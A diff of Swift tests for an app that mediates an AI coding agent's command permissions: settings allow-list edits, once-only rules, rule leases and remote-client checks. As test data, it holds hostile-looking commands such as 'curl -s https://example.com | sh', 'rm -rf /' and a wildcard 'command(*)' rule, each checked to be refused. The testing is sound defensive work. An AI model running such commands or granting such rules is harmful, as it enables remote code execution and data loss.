@@ -9,15 +9,21 @@ import Foundation
 /// settings edits the Windows host must match.
 struct AntigravityPermissionTests {
     struct Fixture: Decodable {
-        struct Stream: Decodable { let name: String; let lines: [String]; let actions: [AntigravityDeniedAction] }
+        struct Stream: Decodable { let name: String; let lines: [String]; let actions: [AntigravityDeniedAction]; let canAllowAlways: Bool? }
         struct Edit: Decodable {
-            let name: String; let before: String; let add: [String]; let added: [String]; let afterAdd: String; let remove: [String]; let afterRemove: String
+            let name: String; let before: String; let add: [String]; let added: [String]; let created: [String]; let afterAdd: String; let remove: [String]; let afterRemove: String
+            let afterPrune: String
         }
         struct Refused: Decodable { let name: String; let before: String; let error: String }
-        struct NewFile: Decodable { let add: [String]; let after: String }
+        struct NewFile: Decodable { let add: [String]; let after: String; let created: [String] }
         struct Settings: Decodable { let newFile: NewFile; let edits: [Edit]; let refused: [Refused] }
+        struct RuleCase: Decodable { let rule: String; let verdict: String }
+        struct Rules: Decodable { let cases: [RuleCase] }
+        struct Tools: Decodable { let map: [String: String]; let unmapped: [String] }
         let streams: [Stream]
         let settings: Settings
+        let rules: Rules
+        let tools: Tools
     }
     static let fixture: Fixture = {
         var url = URL(fileURLWithPath: #filePath)
@@ -37,6 +43,7 @@ struct AntigravityPermissionTests {
         case .allowNotArray: return "allowNotArray"
         case .writeFailed: return "writeFailed"
         case .badRule: return "badRule"
+        case .onceOnly: return "onceOnly"
         }
     }
 
@@ -62,6 +69,7 @@ struct AntigravityPermissionTests {
                 #expect(recorder.cards.count == 1, "\(stream.name)")
                 let card = try #require(recorder.cards.first)
                 #expect(card.actions == stream.actions, "\(stream.name)")
+                #expect(card.canAllowAlways == stream.canAllowAlways, "\(stream.name) always")
                 #expect(card.runId == "run-1" && card.id.hasPrefix("agy-") && CoreValidation.identifier(card.id))
                 // One short transcript line, not the old how-to notice.
                 let notices = recorder.logs.filter { $0.0 == "system" && $0.1.contains("Antigravity declined") }
@@ -107,6 +115,29 @@ struct AntigravityPermissionTests {
         #expect(AntigravityDenialCollector.denialMessage(nil) == nil)
     }
 
+    @Test func whichRulesACardMayOfferFollowsTheSharedCases() {
+        for item in Self.fixture.rules.cases {
+            #expect(AntigravityRuleSafety.verdict(item.rule).rawValue == item.verdict, "\(item.rule)")
+        }
+        #expect(AntigravityRuleSafety.toolPermissions == Self.fixture.tools.map)
+        for tool in Self.fixture.tools.unmapped { #expect(AntigravityRuleSafety.toolPermissions[tool] == nil, "\(tool)") }
+        // A grant carries no refused rule, and only rules that may be kept are kept for good.
+        #expect(!AntigravityAllowGrant(requestId: "agy-1", rules: ["command(*)"], temporary: true).isValid)
+        let chained = AntigravityAllowGrant(requestId: "agy-1", rules: ["command(echo hi && date)"], temporary: false)
+        #expect(chained.isValid && !chained.keepsOnlyAllowedRules)
+        #expect(AntigravityAllowGrant(requestId: "agy-1", rules: ["command(echo hi && date)"], temporary: true).keepsOnlyAllowedRules)
+    }
+
+    @Test func aQueuedItemKeepsItsRecordedModeWhenItsStylePlansEveryRequest() {
+        // The run's own decision when it was queued wins, plan-mode style or not.
+        let queued = QueuedInput(text: "go", permissionModeOverride: nil)
+        #expect(BackgroundQueuePolicy.launchOverride(queued: queued, launchesInPlan: true) == nil)
+        #expect(BackgroundQueuePolicy.launchOverride(queued: QueuedInput(text: "go", permissionModeOverride: "plan"), launchesInPlan: false) == "plan")
+        // Anything not queued starts in plan mode in such a style.
+        #expect(BackgroundQueuePolicy.launchOverride(queued: nil, launchesInPlan: true) == "plan")
+        #expect(BackgroundQueuePolicy.launchOverride(queued: nil, launchesInPlan: false) == nil)
+    }
+
     // MARK: Settings bytes
 
     @Test func settingsEditsChangeOnlyTheAllowList() throws {
@@ -114,8 +145,11 @@ struct AntigravityPermissionTests {
             let added = try AntigravitySettingsText.adding(edit.add, to: Data(edit.before.utf8), path: "s.json")
             #expect(String(decoding: added.data, as: UTF8.self) == edit.afterAdd, "\(edit.name) add")
             #expect(added.added == edit.added, "\(edit.name) added")
+            #expect(added.created.map(\.rawValue) == edit.created, "\(edit.name) created")
             let removed = try AntigravitySettingsText.removing(edit.remove, from: added.data, path: "s.json")
             #expect(String(decoding: removed.data, as: UTF8.self) == edit.afterRemove, "\(edit.name) remove")
+            let pruned = try AntigravitySettingsText.pruning(Set(added.created), from: removed.data, path: "s.json")
+            #expect(String(decoding: pruned.data, as: UTF8.self) == edit.afterPrune, "\(edit.name) prune")
             // Whatever else the file held reads the same.
             let before = try JSONSerialization.jsonObject(with: Data(edit.before.utf8)) as? NSDictionary
             var after = try JSONSerialization.jsonObject(with: added.data) as? [String: Any]
@@ -130,6 +164,11 @@ struct AntigravityPermissionTests {
             #expect(NSDictionary(dictionary: after ?? [:]).isEqual(to: original ?? [:]), "\(edit.name) other keys")
         }
         #expect(String(decoding: AntigravitySettingsText.newFile(Self.fixture.settings.newFile.add), as: UTF8.self) == Self.fixture.settings.newFile.after)
+        // A file the app made holds nothing once its rules and their section go.
+        let made = Data(Self.fixture.settings.newFile.after.utf8)
+        let emptied = try AntigravitySettingsText.removing(Self.fixture.settings.newFile.add, from: made, path: "s.json").data
+        #expect(try AntigravitySettingsText.pruning([.file], from: emptied, path: "s.json").empty)
+        #expect(Self.fixture.settings.newFile.created == ["file"])
     }
 
     @Test func settingsThatAreNotTheExpectedShapeAreRefused() {
@@ -153,7 +192,9 @@ struct AntigravityPermissionTests {
             if let text { try Data(text.utf8).write(to: settings) }
         }
         func text() -> String? { (try? Data(contentsOf: settings)).map { String(decoding: $0, as: UTF8.self) } }
-        func leases() -> AntigravityRuleLeases { AntigravityRuleLeases(settingsURL: settings, ledgerURL: ledger) }
+        func leases(retryDelays: [Duration] = [.milliseconds(10), .milliseconds(20)], recheckDelay: Duration = .zero) -> AntigravityRuleLeases {
+            AntigravityRuleLeases(settingsURL: settings, ledgerURL: ledger, retryDelays: retryDelays, recheckDelay: recheckDelay)
+        }
         func cleanup() { try? FileManager.default.removeItem(at: root) }
     }
     static let real = fixture.settings.edits[0].before
@@ -168,6 +209,8 @@ struct AntigravityPermissionTests {
         #expect(await leases.held() == ["command(echo hi)": 1])
         await leases.release(lease)
         #expect(folder.text() == Self.real)
+        // The ledger lets go once a second look finds the rule gone.
+        await leases.settled()
         #expect(!FileManager.default.fileExists(atPath: folder.ledger.path))
         #expect(await leases.held().isEmpty)
         // Releasing twice changes nothing.
@@ -202,8 +245,14 @@ struct AntigravityPermissionTests {
         let held = try #require(try await leases.apply(AntigravityAllowGrant(requestId: "agy-2", rules: ["command(echo hi)"], temporary: true)))
         #expect(try await leases.apply(AntigravityAllowGrant(requestId: "agy-3", rules: ["command(echo hi)", "command(pwd)"], temporary: false)) == nil)
         await leases.release(held)
+        await leases.settled()
         #expect(folder.text()?.contains("\"command(echo hi)\"") == true && folder.text()?.contains("\"command(pwd)\"") == true)
         #expect(await leases.held().isEmpty && !FileManager.default.fileExists(atPath: folder.ledger.path))
+        // A rule that may be allowed only once is never kept for good.
+        do { _ = try await leases.apply(AntigravityAllowGrant(requestId: "agy-4", rules: ["command(rm -rf build)"], temporary: false)); Issue.record("kept a once-only rule") }
+        catch { #expect(Self.errorName(error) == "onceOnly") }
+        do { _ = try await leases.apply(AntigravityAllowGrant(requestId: "agy-4", rules: ["command(*)"], temporary: true)); Issue.record("added command(*)") }
+        catch { #expect(Self.errorName(error) == "badRule") }
     }
 
     @Test func settingsThatCannotBeReadAreLeftAloneAndRefused() async throws {
@@ -227,16 +276,84 @@ struct AntigravityPermissionTests {
         catch { #expect(Self.errorName(error) == "badRule") }
     }
 
-    @Test func aMissingFileIsCreatedWithTheRuleAlone() async throws {
+    @Test func aMissingFileIsCreatedWithTheRuleAloneAndGoesWithIt() async throws {
         let folder = Folder(); defer { folder.cleanup() }
         try folder.make(nil)
         let leases = folder.leases()
         let lease = try #require(try await leases.apply(AntigravityAllowGrant(requestId: "agy-1", rules: ["command(echo hi)"], temporary: true)))
         #expect(folder.text() == Self.fixture.settings.newFile.after)
         await leases.release(lease)
-        #expect(folder.text() == "{\n  \"permissions\": {\n    \"allow\": []\n  }\n}\n")
-        // Nothing else was left in the folder.
-        #expect(try FileManager.default.contentsOfDirectory(atPath: folder.settings.deletingLastPathComponent().path) == ["settings.json"])
+        await leases.settled()
+        // The file the app made ends empty, so it goes; nothing else was left in the folder.
+        #expect(folder.text() == nil)
+        #expect(try FileManager.default.contentsOfDirectory(atPath: folder.settings.deletingLastPathComponent().path).isEmpty)
+        #expect(!FileManager.default.fileExists(atPath: folder.ledger.path))
+        // A section the app added to an existing file goes too, byte for byte.
+        let noSection = "{\r\n  \"model\": \"x\"\r\n}\r\n"
+        try folder.make(noSection)
+        let again = try #require(try await leases.apply(AntigravityAllowGrant(requestId: "agy-2", rules: ["command(echo hi)"], temporary: true)))
+        #expect(folder.text()?.contains("\r\n    \"allow\": [\r\n") == true)
+        await leases.release(again); await leases.settled()
+        #expect(folder.text() == noSection)
+    }
+
+    @Test func aFailedRemovalIsTriedAgainAndKeptInTheLedgerUntilItWorks() async throws {
+        let folder = Folder(); defer { folder.cleanup() }
+        try folder.make(Self.real)
+        let directory = folder.settings.deletingLastPathComponent().path
+        let leases = folder.leases(retryDelays: [.milliseconds(20), .milliseconds(20)])
+        let first = try #require(try await leases.apply(AntigravityAllowGrant(requestId: "agy-1", rules: ["command(echo hi)"], temporary: true)))
+        // The folder cannot be written: every try fails, and the ledger keeps the rule.
+        try FileManager.default.setAttributes([.posixPermissions: 0o500], ofItemAtPath: directory)
+        await leases.release(first)
+        await leases.settled()
+        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: directory)
+        #expect(folder.text()?.contains("command(echo hi)") == true)
+        #expect((try? String(contentsOf: folder.ledger, encoding: .utf8))?.contains("command(echo hi)") == true)
+        // The next release tries it again.
+        let other = try #require(try await leases.apply(AntigravityAllowGrant(requestId: "agy-2", rules: ["command(pwd)"], temporary: true)))
+        await leases.release(other); await leases.settled()
+        #expect(folder.text() == Self.real && !FileManager.default.fileExists(atPath: folder.ledger.path))
+        // A pause between tries: the folder comes back during it, and the removal goes through.
+        let slow = folder.leases(retryDelays: [.milliseconds(400), .milliseconds(400)])
+        let third = try #require(try await slow.apply(AntigravityAllowGrant(requestId: "agy-3", rules: ["command(echo hi)"], temporary: true)))
+        try FileManager.default.setAttributes([.posixPermissions: 0o500], ofItemAtPath: directory)
+        let reopen = Task { try? await Task.sleep(for: .milliseconds(150)); try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: directory) }
+        await slow.release(third)
+        _ = await reopen.value
+        await slow.settled()
+        #expect(folder.text() == Self.real && !FileManager.default.fileExists(atPath: folder.ledger.path))
+    }
+
+    @Test func aRuleAgyWritesBackIsTakenOutAgain() async throws {
+        let folder = Folder(); defer { folder.cleanup() }
+        try folder.make(Self.real)
+        let leases = folder.leases(recheckDelay: .milliseconds(300))
+        let lease = try #require(try await leases.apply(AntigravityAllowGrant(requestId: "agy-1", rules: ["command(echo hi)"], temporary: true)))
+        let withRule = try #require(folder.text())
+        await leases.release(lease)
+        #expect(folder.text() == Self.real)
+        // A running agy saves the settings it read earlier, the rule with them.
+        try Data(withRule.utf8).write(to: folder.settings)
+        #expect(FileManager.default.fileExists(atPath: folder.ledger.path))
+        await leases.settled()
+        #expect(folder.text() == Self.real && !FileManager.default.fileExists(atPath: folder.ledger.path))
+    }
+
+    @Test func afterQuitNothingIsAddedAndALinkToNothingIsLeftAlone() async throws {
+        let folder = Folder(); defer { folder.cleanup() }
+        try folder.make(Self.real)
+        let leases = folder.leases()
+        await leases.releaseAll()
+        do { _ = try await leases.apply(AntigravityAllowGrant(requestId: "agy-1", rules: ["command(echo hi)"], temporary: true)); Issue.record("applied after quit") }
+        catch { #expect(error is CancellationError) }
+        #expect(folder.text() == Self.real)
+        // A dangling link is refused, not replaced by a new file.
+        try FileManager.default.removeItem(at: folder.settings)
+        try FileManager.default.createSymbolicLink(atPath: folder.settings.path, withDestinationPath: folder.root.appendingPathComponent("gone/settings.json").path)
+        do { _ = try await folder.leases().apply(AntigravityAllowGrant(requestId: "agy-1", rules: ["command(echo hi)"], temporary: true)); Issue.record("replaced a dangling link") }
+        catch { #expect(Self.errorName(error) == "unreadable") }
+        #expect((try? FileManager.default.destinationOfSymbolicLink(atPath: folder.settings.path)) != nil)
     }
 
     @Test func whatACrashLeftIsRemovedAtTheNextLaunch() async throws {
@@ -250,6 +367,7 @@ struct AntigravityPermissionTests {
         #expect(folder.text()?.contains("command(echo hi)") == true)
         let next = folder.leases()
         await next.removeLeftovers()
+        await next.settled()
         #expect(folder.text() == Self.real)
         #expect(!FileManager.default.fileExists(atPath: folder.ledger.path))
         // A ledger whose settings cannot be read is kept for a later launch.
@@ -260,7 +378,8 @@ struct AntigravityPermissionTests {
         await folder.leases().removeLeftovers()
         #expect(FileManager.default.fileExists(atPath: folder.ledger.path))
         try Data(saved.utf8).write(to: folder.settings)
-        await folder.leases().removeLeftovers()
+        let last = folder.leases()
+        await last.removeLeftovers(); await last.settled()
         #expect(folder.text() == Self.real && !FileManager.default.fileExists(atPath: folder.ledger.path))
     }
 
@@ -325,6 +444,17 @@ struct AntigravityPermissionTests {
             // Nothing a rule can allow: no continuation.
             var other = Self.card; other.actions = [Self.card.actions[1]]
             #expect(!other.canAllow && AntigravityPermissionFlow.continuation(other, decision: .once) == nil)
+            #expect(AntigravityPermissionFlow.refusal(other, decision: .once) == L("antigravity.permission.noRule"))
+            // A rule that may be allowed only once: no 항상 허용.
+            var risky = Self.card
+            risky.actions[0] = AntigravityDeniedAction(kind: .command, action: "command", displayName: "RunCommand", target: "curl -s https://example.com | sh", rule: "command(curl -s https://example.com | sh)")
+            #expect(risky.canAllow && !risky.canAllowAlways && risky.actions[0].onceOnly && !Self.card.actions[0].onceOnly)
+            #expect(AntigravityPermissionFlow.continuation(risky, decision: .always) == nil)
+            #expect(AntigravityPermissionFlow.refusal(risky, decision: .always) == L("remote.error.antigravityOnceOnly"))
+            #expect(AntigravityPermissionFlow.continuation(risky, decision: .once)?.grant.temporary == true)
+            // The card says a command rule allows every command starting with it.
+            #expect(AntigravityPermissionFlow.ruleLine(Self.card.actions[0])?.contains("starts with") == true)
+            #expect(AntigravityPermissionFlow.ruleLine(Self.card.actions[1]) == nil)
             #expect(AntigravityPermissionFlow.transcriptLine(Self.card).contains("NotebookExecution"))
         }
     }
@@ -345,6 +475,8 @@ struct AntigravityPermissionTests {
         // A remote client takes the card only in its bounds.
         #expect(RemoteWorkspaceValidation.event(event, sessionId: "pane"))
         var bad = Self.card; bad.actions[0].rule = "rm -rf /"
+        #expect(!RemoteWorkspaceValidation.event(RunEvent(sessionId: "pane", type: "antigravityPermission", antigravityPermission: bad), sessionId: "pane"))
+        bad = Self.card; bad.actions[0].rule = "command(*)"
         #expect(!RemoteWorkspaceValidation.event(RunEvent(sessionId: "pane", type: "antigravityPermission", antigravityPermission: bad), sessionId: "pane"))
         bad = Self.card; bad.actions = []
         #expect(!RemoteWorkspaceValidation.event(RunEvent(sessionId: "pane", type: "antigravityPermission", antigravityPermission: bad), sessionId: "pane"))
@@ -408,6 +540,7 @@ private func agyWait(_ seconds: Double = 30, _ condition: () async -> Bool) asyn
             try Data(AntigravityPermissionTests.real.utf8).write(to: settings)
             let binary = root.appendingPathComponent("agy")
             let denied = #"{"event":"step_update","step_update":{"step_index":2,"state":"ERROR","step_type":"tool","tool_name":"run_command","tool_info":{"name":"run_command","parameters":{"CommandLine":"echo hi"},"error":{"type":"TOOL_ERROR","message":"permission check failed for unsandboxed \"echo hi\": user denied permission to run command:\necho hi\nDo not attempt to circumvent this denial."}}}}"#
+            let deniedChain = #"{"event":"step_update","step_update":{"step_index":2,"state":"ERROR","step_type":"tool","tool_name":"run_command","tool_info":{"name":"run_command","parameters":{"CommandLine":"echo hi && date"},"error":{"type":"TOOL_ERROR","message":"permission check failed for unsandboxed \"echo hi && date\": user denied permission to run command:\necho hi && date\nDo not attempt to circumvent this denial."}}}}"#
             let source = """
             #!/bin/sh
             if [ "$1" = "--version" ]; then printf '1.4.4\\n'; exit 0; fi
@@ -418,7 +551,10 @@ private func agyWait(_ seconds: Double = 30, _ condition: () async -> Bool) asyn
                 if /usr/bin/grep -q 'command(echo hi)' '\(settings.path)'; then answer=allowed; else answer=missing; fi
                 printf '{"event":"result","result":{"conversation_id":"conv-1","status":"SUCCESS","response":"%s"}}\\n' "$answer" ;;
               *)
-                printf '%s\\n' '\(denied)'
+                case "$input $*" in
+                  *risky*) printf '%s\\n' '\(deniedChain)' ;;
+                  *) printf '%s\\n' '\(denied)' ;;
+                esac
                 printf '%s\\n' '{"event":"result","result":{"conversation_id":"conv-1","status":"SUCCESS","response":"","denied_actions":[{"action":"command","display_name":"RunCommand"}]}}' ;;
             esac
             """
@@ -482,11 +618,40 @@ private func agyWait(_ seconds: Double = 30, _ condition: () async -> Bool) asyn
             let continuation = try #require(AntigravityPermissionFlow.continuation(card, decision: .once))
             var request = StartRunRequest(sessionId: "pane", workspaceId: opened.id, input: continuation.prompt, provider: "gemini", resumeId: "conv-1")
             request.antigravityGrant = continuation.grant
+            // 항상 허용 from another computer needs the host's full-access switch.
+            var always = request
+            always.antigravityGrant = AntigravityAllowGrant(requestId: card.id, rules: card.rules, temporary: false)
+            do { try await client.start(request: always, workspace: opened, phaseModels: nil); Issue.record("always without full access") }
+            catch { #expect((error as? RemoteHTTPFailure)?.status == 403) }
+            #expect(folder.text() == AntigravityPermissionTests.real)
             try await client.start(request: request, workspace: opened, phaseModels: nil)
             try await agyWait { events.ended("pane").count == 2 }
             #expect(events.values.contains { $0.entry?.kind == "assistant" && $0.entry?.text == "allowed" })
             try await agyWait { folder.text() == AntigravityPermissionTests.real }
             #expect(await rules.held().isEmpty)
+            // A card's rules are granted once: the same grant again is refused.
+            do { try await client.start(request: request, workspace: opened, phaseModels: nil); Issue.record("a used card was granted again") }
+            catch { #expect((error as? RemoteHTTPFailure)?.status == 403) }
+            // With full access on, always is taken for a rule that may be kept,
+            _ = await host.setAllowsFullAccess(true)
+            try await client.start(request: StartRunRequest(sessionId: "pane", workspaceId: opened.id, input: "risky", provider: "gemini"), workspace: opened, phaseModels: nil)
+            try await agyWait { events.ended("pane").count == 3 }
+            let chained = try #require(events.values.last { $0.type == "antigravityPermission" }?.antigravityPermission)
+            #expect(chained.rules == ["command(echo hi && date)"] && !chained.canAllowAlways)
+            // and still refused for one that may be allowed only once.
+            var risky = request
+            risky.antigravityGrant = AntigravityAllowGrant(requestId: chained.id, rules: chained.rules, temporary: false)
+            do { try await client.start(request: risky, workspace: opened, phaseModels: nil); Issue.record("kept a once-only rule") }
+            catch { #expect((error as? RemoteHTTPFailure)?.status == 409) }
+            #expect(folder.text() == AntigravityPermissionTests.real)
+            try await client.start(request: StartRunRequest(sessionId: "pane", workspaceId: opened.id, input: "say hi", provider: "gemini"), workspace: opened, phaseModels: nil)
+            try await agyWait { events.ended("pane").count == 4 }
+            let plain = try #require(events.values.last { $0.type == "antigravityPermission" }?.antigravityPermission)
+            var kept = request
+            kept.antigravityGrant = AntigravityAllowGrant(requestId: plain.id, rules: plain.rules, temporary: false)
+            try await client.start(request: kept, workspace: opened, phaseModels: nil)
+            try await agyWait { events.ended("pane").count == 5 }
+            #expect(folder.text().contains("\"command(echo hi)\""))
             await cleanup()
         } catch { await cleanup(); throw error }
     }
@@ -533,6 +698,15 @@ struct AntigravityPermissionWireTests {
             let remote = try #require(Self.fixture["remote"] as? [String: Any])
             let poll = try JSONDecoder().decode(RemoteWirePoll.self, from: JSONSerialization.data(withJSONObject: try #require(remote["pollEvent"])))
             #expect(MobilePermission(antigravity: try #require(poll.events.first?.event.antigravityPermission)) == sample)
+            #expect(sample.antigravity?.actions.first?.onceOnly == true && sample.antigravity?.actions.last?.onceOnly == nil)
+            // The recorded command's card: 항상 허용 is offered, and nothing says once-only.
+            let plainSample = try #require(mobile["permissionPlain"] as? [String: Any])
+            let plain = try Self.roundTrips(try #require(plainSample["permission"]), MobilePermission.self)
+            let stream = try #require(AntigravityPermissionTests.fixture.streams.first { $0.name == plainSample["stream"] as? String })
+            var made = AntigravityPermissionRequest(id: plain.id, runId: plain.runId, actions: stream.actions, receivedAt: plain.receivedAt)
+            #expect(MobilePermission(antigravity: made) == plain && made.canAllowAlways)
+            made.actions = []
+            #expect(!made.canAllow)
             for answer in try #require(mobile["answers"] as? [[String: Any]]) {
                 let body = try JSONDecoder().decode(MobilePermissionAnswer.self, from: JSONSerialization.data(withJSONObject: try #require(answer["body"])))
                 if let decision = answer["decision"] as? String { #expect(body.antigravityDecision.rawValue == decision) }
